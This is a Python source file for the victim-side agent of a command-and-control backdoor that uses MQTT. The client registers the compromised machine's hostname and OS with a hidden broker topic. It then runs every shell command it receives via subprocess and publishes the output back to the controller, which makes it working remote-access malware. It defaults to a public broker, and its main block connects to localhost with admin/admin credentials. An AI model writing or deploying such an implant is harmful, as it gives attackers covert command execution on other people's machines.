from paho.mqtt import client as mqtt

from uuid import uuid4
from datetime import datetime
from base64 import b64encode, b64decode
from subprocess import check_output
import json
import platform


class Utils:
    """Utilities Class"""
    @staticmethod
    def encode(data):
        """Encodes the message"""
        return b64encode(json.dumps(data).encode())

    @staticmethod
    def decode(data):
        """Decode the message"""
        return json.loads(b64decode(data).decode())

    @staticmethod
    def calc_uuid():
        """Calculate a unique identifier"""
        return uuid4().hex

    @staticmethod
    def determine_os():
        """Returns the operating system string"""
        return platform.system().lower()

    @staticmethod
    def determine_hostname():
        """Returns the hostname"""
        return platform.node()

    @staticmethod
    def now():
        """Returns the current time in iso format"""
        return datetime.now().isoformat()

    @staticmethod
    def exec(command):
        """Executes a system command"""
        return check_output(command.split()).decode()


class VictimClient(object):
    """The Victim Client Class"""

    def __init__(self, client_id=None, host="m2m.eclipse.org", port=1883, timeout=60, username=None, password=None):
        """The class initializer"""

        self._mqtt_client = mqtt.Client(client_id)
        
        self.host = host
        self.port = port
        self.timeout = timeout

        self.username = username
        self.password = password

        self.uuid = Utils.calc_uuid()
        self.os = Utils.determine_os()
        self.hostname = Utils.determine_hostname()

        self._base_topic = '$SYS/test123'
        self._output_topic = f"{self._base_topic}/output/{self.uuid}"
        self._register_topic = f"{self._base_topic}/register/{self.uuid}"

        self._subscription_topics = [
            (f'{self._base_topic}/input/{self.uuid}', 0),
        ]

        self._mqtt_client.on_connect = self.mqtt_on_connect
        self._mqtt_client.on_message = self.mqtt_on_message
        self._mqtt_client.on_subscribe = self.mqtt_on_subscribe

    def register(self):
        """Registers this victim into the C2"""

        self.publish(topic=self._register_topic, payload={
            'uuid': self.uuid,
            'os': self.os,
            'hostname': self.hostname,
            'ts': Utils.now()
        })

    def publish(self, topic, payload):
        """Publishes a message to the C2"""

        encoded_payload = Utils.encode(payload)
        self._mqtt_client.publish(topic=topic, payload=encoded_payload)

    def mqtt_on_connect(self, mqtt_client, obj, flags, rc):
        """Handles connection"""

        if rc == mqtt.MQTT_ERR_SUCCESS:
            print('Connection succeeded')
        else:
            print('Connection failed')
            self.handle_failed_connection()

    def handle_failed_connection(self):
        self._mqtt_client.disconnect()
        self._mqtt_client.loop_stop()
        exit(1)

    def mqtt_on_message(self, mqtt_client, obj, msg):
        """Handles when a new message arrives"""

        print(f"{msg.topic} {msg.qos} {msg.payload}")

        data = Utils.decode(msg.payload)

        self.publish(topic=self._output_topic, payload={
            'command_id': data.get('command_id'),
            'uuid': self.uuid,
            'ts': Utils.now(),
            'output': Utils.exec(data.get('command'))
        })

    def mqtt_on_subscribe(self, mqtt_client, obj, mid, granted_qos):
        """Handles when the victim subscribes to a topic"""

        print(f"Subscribed: {mid} {granted_qos}")

    def run(self):
        """The victim's driver function"""

        if self.username and self.password:
            self._mqtt_client.username_pw_set(self.username, self.password)

        self._mqtt_client.connect(self.host, self.port, self.timeout)
        self._mqtt_client.subscribe(self._subscription_topics)

        self.register()
        self._mqtt_client.loop_forever()


if __name__ == '__main__':
    # c = VictimClient()
    # c.run()

    VictimClient(
        host='localhost',
        port=1884,
        username='admin',
        password='admin'
    ).run()

